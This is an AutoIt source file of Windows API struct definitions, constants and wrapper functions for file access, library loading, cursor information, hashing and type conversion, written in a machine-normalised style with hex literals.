Global Const $TAGTVITEM = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $TAGTVITEMEX = "struct;" & $TAGTVITEM & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $TAGNMTREEVIEW = $TAGNMHDR & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $TAGNMTVCUSTOMDRAW = "struct;" & $TAGNMHDR & ";dword DrawStage;handle HDC;" & $TAGRECT & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $TAGNMTVDISPINFO = $TAGNMHDR & ";" & $TAGTVITEM
Global Const $TAGNMTVGETINFOTIP = $TAGNMHDR & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $TAGNMTVITEMCHANGE = $TAGNMHDR & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $TAGTVHITTESTINFO = $TAGPOINT & ";uint Flags;handle Item"
Global Const $TAGNMTVKEYDOWN = $TAGNMHDR & ";align 2;word VKey;uint Flags"
Global Const $TAGNMMOUSE = $TAGNMHDR & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $TAGPOINT & ";lparam HitInfo"
Global Const $TAGTOKEN_PRIVILEGES = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $TAGIMAGEINFO = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $TAGRECT
Global Const $TAGMENUINFO = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $TAGMENUITEMINFO = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $TAGREBARBANDINFO = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? ''  : ";" & $TAGRECT & ";uint uChevronState")
Global Const $TAGNMREBARAUTOBREAK = $TAGNMHDR & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $TAGNMRBAUTOSIZE = $TAGNMHDR & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $TAGNMREBAR = $TAGNMHDR & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $TAGNMREBARCHEVRON = $TAGNMHDR & ";uint uBand;uint wID;lparam lParam;" & $TAGRECT & ";lparam lParamNM"
Global Const $TAGNMREBARCHILDSIZE = $TAGNMHDR & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $TAGCOLORSCHEME = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $TAGNMTOOLBAR = $TAGNMHDR & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $TAGRECT
Global Const $TAGNMTBHOTITEM = $TAGNMHDR & ";int idOld;int idNew;dword dwFlags"
Global Const $TAGTBBUTTON = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $TAGTBBUTTONINFO = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $TAGNETRESOURCE = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $TAGOVERLAPPED = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $TAGOPENFILENAME = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $TAGBITMAPINFOHEADER = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $TAGBITMAPINFO = $TAGBITMAPINFOHEADER & ";dword biRGBQuad[1]"
Global Const $TAGBLENDFUNCTION = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $TAGGUID = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $TAGWINDOWPLACEMENT = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $TAGWINDOWPOS = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $TAGSCROLLINFO = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $TAGSCROLLBARINFO = "dword cbSize;" & $TAGRECT & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $TAGLOGFONT = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $TAGKBDLLHOOKSTRUCT = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $TAGPROCESS_INFORMATION = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $TAGSTARTUPINFO = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $TAGSECURITY_ATTRIBUTES = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $TAGWIN32_FIND_DATA = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword" & _
    " dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $TAGTEXTMETRIC = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
Global Const $HGDI_ERROR = Ptr(+ -1)
Global Const $INVALID_HANDLE_VALUE = Ptr(+ -1)
Global Const $CLR_INVALID = + -1
Global Const $MB_PRECOMPOSED = 0x1
Global Const $MB_COMPOSITE = 0x2
Global Const $MB_USEGLYPHCHARS = 0x4
Global Const $ULW_ALPHA = 0x2
Global Const $ULW_COLORKEY = 0x1
Global Const $ULW_OPAQUE = 0x4
Global Const $ULW_EX_NORESIZE = 0x8
Global Const $WH_CALLWNDPROC = 0x4
Global Const $WH_CALLWNDPROCRET = 0xc
Global Const $WH_CBT = 0x5
Global Const $WH_DEBUG = 0x9
Global Const $WH_FOREGROUNDIDLE = 0xb
Global Const $WH_GETMESSAGE = 0x3
Global Const $WH_JOURNALPLAYBACK = 0x1
Global Const $WH_JOURNALRECORD = 0x0
Global Const $WH_KEYBOARD = 0x2
Global Const $WH_KEYBOARD_LL = 0xd
Global Const $WH_MOUSE = 0x7
Global Const $WH_MOUSE_LL = 0xe
Global Const $WH_MSGFILTER = + -1
Global Const $WH_SHELL = 0xa
Global Const $WH_SYSMSGFILTER = 0x6
Global Const $WPF_ASYNCWINDOWPLACEMENT = 0x4
Global Const $WPF_RESTORETOMAXIMIZED = 0x2
Global Const $WPF_SETMINPOSITION = 0x1
Global Const $KF_EXTENDED = 0x100
Global Const $KF_ALTDOWN = 0x2000
Global Const $KF_UP = 0x8000
Global Const $LLKHF_EXTENDED = BitShift($KF_EXTENDED, 0x8)
Global Const $LLKHF_LOWER_IL_INJECTED = 0x2
Global Const $LLKHF_INJECTED = 0x10
Global Const $LLKHF_ALTDOWN = BitShift($KF_ALTDOWN, 0x8)
Global Const $LLKHF_UP = BitShift($KF_UP, 0x8)
Global Const $LVKF_ALT = 0x1
Global Const $LVKF_CONTROL = 0x2
Global Const $LVKF_SHIFT = 0x4
Global Const $OFN_ALLOWMULTISELECT = 0x200
Global Const $OFN_CREATEPROMPT = 0x2000
Global Const $OFN_DONTADDTORECENT = 0x2000000
Global Const $OFN_ENABLEHOOK = 0x20
Global Const $OFN_ENABLEINCLUDENOTIFY = 0x400000
Global Const $OFN_ENABLESIZING = 0x800000
Global Const $OFN_ENABLETEMPLATE = 0x40
Global Const $OFN_ENABLETEMPLATEHANDLE = 0x80
Global Const $OFN_EXPLORER = 0x80000
Global Const $OFN_EXTENSIONDIFFERENT = 0x400
Global Const $OFN_FILEMUSTEXIST = 0x1000
Global Const $OFN_FORCESHOWHIDDEN = 0x10000000
Global Const $OFN_HIDEREADONLY = 0x4
Global Const $OFN_LONGNAMES = 0x200000
Global Const $OFN_NOCHANGEDIR = 0x8
Global Const $OFN_NODEREFERENCELINKS = 0x100000
Global Const $OFN_NOLONGNAMES = 0x40000
Global Const $OFN_NONETWORKBUTTON = 0x20000
Global Const $OFN_NOREADONLYRETURN = 0x8000
Global Const $OFN_NOTESTFILECREATE = 0x10000
Global Const $OFN_NOVALIDATE = 0x100
Global Const $OFN_OVERWRITEPROMPT = 0x2
Global Const $OFN_PATHMUSTEXIST = 0x800
Global Const $OFN_READONLY = 0x1
Global Const $OFN_SHAREAWARE = 0x4000
Global Const $OFN_SHOWHELP = 0x10
Global Const $OFN_EX_NOPLACESBAR = 0x1
Global Const $STD_CUT = 0x0
Global Const $STD_COPY = 0x1
Global Const $STD_PASTE = 0x2
Global Const $STD_UNDO = 0x3
Global Const $STD_REDOW = 0x4
Global Const $STD_DELETE = 0x5
Global Const $STD_FILENEW = 0x6
Global Const $STD_FILEOPEN = 0x7
Global Const $STD_FILESAVE = 0x8
Global Const $STD_PRINTPRE = 0x9
Global Const $STD_PROPERTIES = 0xa
Global Const $STD_HELP = 0xb
Global Const $STD_FIND = 0xc
Global Const $STD_REPLACE = 0xd
Global Const $STD_PRINT = 0xe
Global Const $KB_SENDSPECIAL = 0x0
Global Const $KB_SENDRAW = 0x1
Global Const $KB_CAPSOFF = 0x0
Global Const $KB_CAPSON = 0x1
Global Const $S_OK = 0x0
Global Const $E_ABORT = -2147467260
Global Const $E_ACCESSDENIED = -2147024891
Global Const $E_FAIL = -2147467259
Global Const $E_HANDLE = -2147024890
Global Const $E_INVALIDARG = -2147024809
Global Const $E_NOINTERFACE = -2147467262
Global Const $E_NOTIMPL = -2147467263
Global Const $E_OUTOFMEMORY = -2147024882
Global Const $E_POINTER = -2147467261
Global Const $E_UNEXPECTED = -2147418113
#Region Global Variables and Constants
    Global $__g_venum, $__g_vext = 0x0
    Global $__g_irgbmode = 0x1
    Global Const $TAGOSVERSIONINFO = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
    Global Const $IMAGE_BITMAP = 0x0
    Global Const $IMAGE_ICON = 0x1
    Global Const $IMAGE_CURSOR = 0x2
    Global Const $IMAGE_ENHMETAFILE = 0x3
    Global Const $LR_DEFAULTCOLOR = 0x0
    Global Const $LR_MONOCHROME = 0x1
    Global Const $LR_COLOR = 0x2
    Global Const $LR_COPYRETURNORG = 0x4
    Global Const $LR_COPYDELETEORG = 0x8
    Global Const $LR_LOADFROMFILE = 0x10
    Global Const $LR_LOADTRANSPARENT = 0x20
    Global Const $LR_DEFAULTSIZE = 0x40
    Global Const $LR_VGACOLOR = 0x80
    Global Const $LR_LOADMAP3DCOLORS = 0x1000
    Global Const $LR_CREATEDIBSECTION = 0x2000
    Global Const $LR_COPYFROMRESOURCE = 0x4000
    Global Const $LR_SHARED = 0x8000
    Global Const $__TAGCURSORINFO = "dword Size;dword Flags;handle hCursor;" & "struct;long X;long Y;endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CreateFile($sfilename, $icreation, $iaccess = 0x4, $ishare = 0x0, $iattributes = 0x0, $tsecurity = 0x0)
        Local $ida = 0x0, $ism = 0x0, $icd = 0x0, $ifa = 0x0
        If BitAND($iaccess, 0x1) <> 0x0 Then $ida = BitOR($ida, $GENERIC_EXECUTE)
        If BitAND($iaccess, 0x2) <> 0x0 Then $ida = BitOR($ida, $GENERIC_READ)
        If BitAND($iaccess, 0x4) <> 0x0 Then $ida = BitOR($ida, $GENERIC_WRITE)
        If BitAND($ishare, 0x1) <> 0x0 Then $ism = BitOR($ism, $FILE_SHARE_DELETE)
        If BitAND($ishare, 0x2) <> 0x0 Then $ism = BitOR($ism, $FILE_SHARE_READ)
        If BitAND($ishare, 0x4) <> 0x0 Then $ism = BitOR($ism, $FILE_SHARE_WRITE)
        Switch $icreation
        Case 0x0
            $icd = $CREATE_NEW
        Case 0x1
            $icd = $CREATE_ALWAYS
        Case 0x2
            $icd = $OPEN_EXISTING
        Case 0x3
            $icd = $OPEN_ALWAYS
        Case 0x4
            $icd = $TRUNCATE_EXISTING
        EndSwitch
        If BitAND($iattributes, 0x1) <> 0x0 Then $ifa = BitOR($ifa, $FILE_ATTRIBUTE_ARCHIVE)
        If BitAND($iattributes, 0x2) <> 0x0 Then $ifa = BitOR($ifa, $FILE_ATTRIBUTE_HIDDEN)
        If BitAND($iattributes, 0x4) <> 0x0 Then $ifa = BitOR($ifa, $FILE_ATTRIBUTE_READONLY)
        If BitAND($iattributes, 0x8) <> 0x0 Then $ifa = BitOR($ifa, $FILE_ATTRIBUTE_SYSTEM)
        Local $acall = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "struct*", $tsecurity, "dword", $icd, "dword", $ifa, "ptr", 0x0)
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateFile

    Func _WinAPI_FreeLibrary($hmodule)
        Local $acall = DllCall("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FreeLibrary

    Func _WinAPI_GetCursorInfo()
        Local $tcursor = DllStructCreate($__TAGCURSORINFO)
        Local $icursor = DllStructGetSize($tcursor)
        DllStructSetData($tcursor, "Size", $icursor)
        Local $acall = DllCall("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $acursor[0x5]
        $acursor[0x0] = True
        $acursor[0x1] = DllStructGetData($tcursor, "Flags") <> 0x0
        $acursor[0x2] = DllStructGetData($tcursor, "hCursor")
        $acursor[0x3] = DllStructGetData($tcursor, "X")
        $acursor[0x4] = DllStructGetData($tcursor, "Y")
        Return $acursor
    EndFunc    ; -> _WinAPI_GetCursorInfo

    Func _WinAPI_GetDlgCtrlID($hwnd)
        Local $acall = DllCall("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDlgCtrlID

    Func _WinAPI_GetModuleHandle($smodulename)
        If $smodulename = '' Then $smodulename = Null
        Local $acall = DllCall("kernel32.dll", "handle", "GetModuleHandleW", "wstr", $smodulename)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetModuleHandle

    Func _WinAPI_GetString($pstring, $bunicode = True)
        Local $ilength = _WinAPI_StrLen($pstring, $bunicode)
        If @error Or Not $ilength Then Return SetError(@error + 0xa, @extended, '')
        Local $tstring = DllStructCreate(($bunicode  ? "wchar"  : "char") & "[" & ($ilength + 0x1) & "]", $pstring)
        If @error Then Return SetError(@error, @extended, '')
        Return SetExtended($ilength, DllStructGetData($tstring, 0x1))
    EndFunc    ; -> _WinAPI_GetString

    Func _WinAPI_GetVersion()
        Local $tosvi = DllStructCreate($TAGOSVERSIONINFO)
        DllStructSetData($tosvi, 0x1, DllStructGetSize($tosvi))
        Local $acall = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return Number(DllStructGetData($tosvi, 0x2) & "." & DllStructGetData($tosvi, 0x3), $NUMBER_DOUBLE)
    EndFunc    ; -> _WinAPI_GetVersion

    Func _WinAPI_IsWow64Process($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", (_WinAPI_GetVersion() < 6  ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, False)
        Local $acall = DllCall("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0x0], "bool*", 0x0)
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, False)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_IsWow64Process

    Func _WinAPI_LoadImage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
        Local $acall, $simagetype = "int"
        If IsString($simage) Then $simagetype = "wstr"
        $acall = DllCall("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadImage

    Func _WinAPI_LoadLibrary($sfilename)
        Local $acall = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadLibrary

    Func _WinAPI_PathIsDirectory($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsDirectory

    Func _WinAPI_ReadFile($hfile, $pbuffer, $itoread, ByRef $iread, $toverlapped = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itoread, "dword*", 0x0, "struct*", $toverlapped)
        If @error Then Return SetError(@error, @extended, False)
        $iread = $acall[0x4]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReadFile

    Func _WinAPI_StrLen($pstring, $bunicode = True)
        Local $w = ''
        If $bunicode Then $w = "W"
        Local $acall = DllCall("kernel32.dll", "int", "lstrlen" & $w, "struct*", $pstring)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StrLen

    Func _WinAPI_SwitchColor($icolor)
        If $icolor = + -1 Then Return $icolor
        Return BitOR(BitAND($icolor, 0xff00), BitShift(BitAND($icolor, 0xff), + -16), BitShift(BitAND($icolor, 0xff0000), 0x10))
    EndFunc    ; -> _WinAPI_SwitchColor

    Func _WinAPI_WriteFile($hfile, $pbuffer, $itowrite, ByRef $iwritten, $toverlapped = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itowrite, "dword*", 0x0, "struct*", $toverlapped)
        If @error Then Return SetError(@error, @extended, False)
        $iwritten = $acall[0x4]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WriteFile

#EndRegion Public Functions
#Region Internal Functions
    Func __CheckErrorArrayBounds(Const ByRef $ADATA, ByRef $ISTART, ByRef $IEND, $NDIM = 0x1, $IDIM = $UBOUND_DIMENSIONS)
        If Not IsArray($ADATA) Then Return SetError(0x1, 0x0, 0x1)
        If UBound($ADATA, $IDIM) <> $NDIM Then Return SetError(0x2, 0x0, 0x1)
        If $ISTART < 0x0 Then $ISTART = 0x0
        Local $iubound = UBound($ADATA) + -1
        If $IEND < 0x1 Or $IEND > $iubound Then $IEND = $iubound
        If $ISTART > $IEND Then Return SetError(0x4, 0x0, 0x1)
        Return 0x0
    EndFunc    ; -> __CheckErrorArrayBounds

    Func __CheckErrorCloseHandle($acall, $hfile, $blasterror = False, $icurerr = @error, $icurext = @extended)
        If Not $icurerr And Not $acall[0x0] Then $icurerr = 0xa
        Local $alasterror = DllCall("kernel32.dll", "dword", "GetLastError")
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        If $icurerr Then DllCall("kernel32.dll", "none", "SetLastError", "dword", $alasterror[0x0])
        If $blasterror Then $icurext = $alasterror[0x0]
        Return SetError($icurerr, $icurext, $icurerr)
    EndFunc    ; -> __CheckErrorCloseHandle

    Func __dll($spath, $bpin = False)
        Local $acall = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", ($bpin  ? 0x1  : 0x2), "wstr", $spath, "ptr*", 0x0)
        If Not $acall[0x3] Then
            $acall = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
            If @error Or Not $acall[0x0] Then Return 0x0
        EndIf
        Return 0x1
    EndFunc    ; -> __dll

    Func __EnumWindowsProc($hwnd, $BVISIBLE)
        Local $acall
        If $BVISIBLE Then
            $acall = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
            If Not $acall[0x0] Then
                Return 0x1
            EndIf
        EndIf
        __Inc($__g_venum)
        $__g_venum[$__g_venum[0x0][0x0]][0x0] = $hwnd
        $acall = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", '', "int", 0x1000)
        $__g_venum[$__g_venum[0x0][0x0]][0x1] = $acall[0x2]
        Return 0x1
    EndFunc    ; -> __EnumWindowsProc

    Func __FatalExit($icode, $stext = '')
        If $stext Then MsgBox($MB_SYSTEMMODAL, "AutoIt", $stext)
        DllCall("kernel32.dll", "none", "FatalExit", "int", $icode)
    EndFunc    ; -> __FatalExit

    Func __Inc(ByRef $ADATA, $iincrement = 0x64)
        Select
        Case UBound($ADATA, $UBOUND_COLUMNS)
            If $iincrement < 0x0 Then
                ReDim $ADATA[$ADATA[0x0][0x0] + 0x1][UBound($ADATA, $UBOUND_COLUMNS)]
            Else
                $ADATA[0x0][0x0]+= 0x1
                If $ADATA[0x0][0x0] > UBound($ADATA) + -1 Then
                    ReDim $ADATA[$ADATA[0x0][0x0] + $iincrement][UBound($ADATA, $UBOUND_COLUMNS)]
                EndIf
            EndIf
        Case UBound($ADATA, $UBOUND_ROWS)
            If $iincrement < 0x0 Then
                ReDim $ADATA[$ADATA[0x0] + 0x1]
            Else
                $ADATA[0x0]+= 0x1
                If $ADATA[0x0] > UBound($ADATA) + -1 Then
                    ReDim $ADATA[$ADATA[0x0] + $iincrement]
                EndIf
            EndIf
        Case Else
            Return 0x0
        EndSelect
        Return 0x1
    EndFunc    ; -> __Inc

    Func __rgb($icolor)
        If $__g_irgbmode Then
            $icolor = _WinAPI_SwitchColor($icolor)
        EndIf
        Return $icolor
    EndFunc    ; -> __rgb

#EndRegion Internal Functions
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CharToOem($sstr)
        Local $acall, $sretstr = '', $nlen = StringLen($sstr) + 0x1, $ISTART = 0x1
        While $ISTART < $nlen
            $acall = DllCall("user32.dll", "bool", "CharToOemW", "wstr", StringMid($sstr, $ISTART, 0x10000), "wstr", '')
            If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
            $ISTART += 0x10000
            $sretstr &= $acall[0x2]
        WEnd
        Return $sretstr
    EndFunc    ; -> _WinAPI_CharToOem

    Func _WinAPI_ClientToScreen($hwnd, ByRef $tpoint)
        Local $acall = DllCall("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_ClientToScreen

    Func _WinAPI_DWordToFloat($ivalue)
        Local $tdword = DllStructCreate("dword")
        Local $tfloat = DllStructCreate("float", DllStructGetPtr($tdword))
        DllStructSetData($tdword, 0x1, $ivalue)
        Return DllStructGetData($tfloat, 0x1)
    EndFunc    ; -> _WinAPI_DWordToFloat

    Func _WinAPI_DWordToInt($ivalue)
        Local $tdata = DllStructCreate("int")
        DllStructSetData($tdata, 0x1, $ivalue)
        Return DllStructGetData($tdata, 0x1)
    EndFunc    ; -> _WinAPI_DWordToInt

    Func _WinAPI_FloatToDWord($ivalue)
        Local $tfloat = DllStructCreate("float")
        Local $tdword = DllStructCreate("dword", DllStructGetPtr($tfloat))
        DllStructSetData($tfloat, 0x1, $ivalue)
        Return DllStructGetData($tdword, 0x1)
    EndFunc    ; -> _WinAPI_FloatToDWord

    Func _WinAPI_FloatToInt($nfloat)
        Local $tfloat = DllStructCreate("float")
        Local $tint = DllStructCreate("int", DllStructGetPtr($tfloat))
        DllStructSetData($tfloat, 0x1, $nfloat)
        Return DllStructGetData($tint, 0x1)
    EndFunc    ; -> _WinAPI_FloatToInt

    Func _WinAPI_GetXYFromPoint(ByRef $tpoint, ByRef $ix, ByRef $iy)
        $ix = DllStructGetData($tpoint, "X")
        $iy = DllStructGetData($tpoint, "Y")
    EndFunc    ; -> _WinAPI_GetXYFromPoint

    Func _WinAPI_GUIDFromString($sguid)
        Local $tguid = DllStructCreate($TAGGUID)
        If Not _WinAPI_GUIDFromStringEx($sguid, $tguid) Then Return SetError(@error, @extended, 0x0)
        Return $tguid
    EndFunc    ; -> _WinAPI_GUIDFromString

    Func _WinAPI_GUIDFromStringEx($sguid, $tguid)
        Local $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
        If @error Then Return SetError(@error, @extended, False)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], False)
        Return True
    EndFunc    ; -> _WinAPI_GUIDFromStringEx

    Func _WinAPI_HashData($pmemory, $isize, $ilength = 0x20)
        If ($ilength <= 0x0) Or ($ilength > 0x100) Then Return SetError(0xb, 0x0, 0x0)
        Local $tdata = DllStructCreate("byte[" & $ilength & "]")
        Local $acall = DllCall("shlwapi.dll", "uint", "HashData", "struct*", $pmemory, "dword", $isize, "struct*", $tdata, "dword", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return DllStructGetData($tdata, 0x1)
    EndFunc    ; -> _WinAPI_HashData

    Func _WinAPI_HashString($sstring, $bcasesensitive = True, $ilength = 0x20)
        Local $ilengths = StringLen($sstring)
        If Not $ilengths Or ($ilength > 0x100) Then Return SetError(0xc, 0x0, 0x0)
        Local $tstring = DllStructCreate("wchar[" & ($ilengths + 0x1) & "]")
        If Not $bcasesensitive Then
            $sstring = StringLower($sstring)
        EndIf
        DllStructSetData($tstring, 0x1, $sstring)
        Local $shash = _WinAPI_HashData($tstring, 0x2 * $ilengths, $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $shash
    EndFunc    ; -> _WinAPI_HashString

    Func _WinAPI_HiByte($ivalue)
        Return BitAND(BitShift($ivalue, 0x8), 0xff)
    EndFunc    ; -> _WinAPI_HiByte

    Func _WinAPI_HiDWord($ivalue)
        Local $tint64 = DllStructCreate("int64")
        Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
        DllStructSetData($tint64, 0x1, $ivalue)
        Return DllStructGetData($tqword, 0x2)
    EndFunc    ; -> _WinAPI_HiDWord

    Func _WinAPI_HiWord($ilong)
        Return BitShift($ilong, 0x10)
    EndFunc    ; -> _WinAPI_HiWord

    Func _WinAPI_IntToDWord($ivalue)
        Local $tdata = DllStructCreate("dword")
        DllStructSetData($tdata, 0x1, $ivalue)
        Return DllStructGetData($tdata, 0x1)
    EndFunc    ; -> _WinAPI_IntToDWord

    Func _WinAPI_IntToFloat($iint)
        Local $tint = DllStructCreate("int")
        Local $tfloat = DllStructCreate("float", DllStructGetPtr($tint))
        DllStructSetData($tint, 0x1, $iint)
        Return DllStructGetData($tfloat, 0x1)
    EndFunc    ; -> _WinAPI_IntToFloat

